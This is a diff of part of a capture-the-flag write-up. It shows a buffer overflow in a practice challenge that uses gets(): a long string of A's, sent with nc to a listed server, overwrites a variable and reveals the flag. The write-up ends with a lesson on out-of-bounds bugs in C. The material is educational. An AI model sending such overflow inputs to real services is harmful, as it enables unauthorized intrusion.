@@ -51,7 +51,7 @@ If we search the internet, we find out that `gets` is unsafe since it doesn't ch
 So, if we provide a string long enough to override x (but short enough to not override other important variables that will crash the program), we'll successfully retrieve the flag:
 
 ```bash
-vianuhack@computer~$ nc 164.92.224.165 1337
+vianuhack@computer:~$ nc 164.92.224.165 1337
 What's your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
 What's your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -60,7 +60,7 @@ What's your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Congrats! You bypassed it!
 Here's your flag: VianuCTF{PWN3D_TH1S_INTRO_B0F!}
 
-vianuhack@computer~$ 
+vianuhack@computer:~$ 
 ```
 
 This is why it's always important to address out-of-bounds array issues (signal 11) when coding in C/C++. While `gets()` is deprecated, there are many other places where issues like this can arise. 
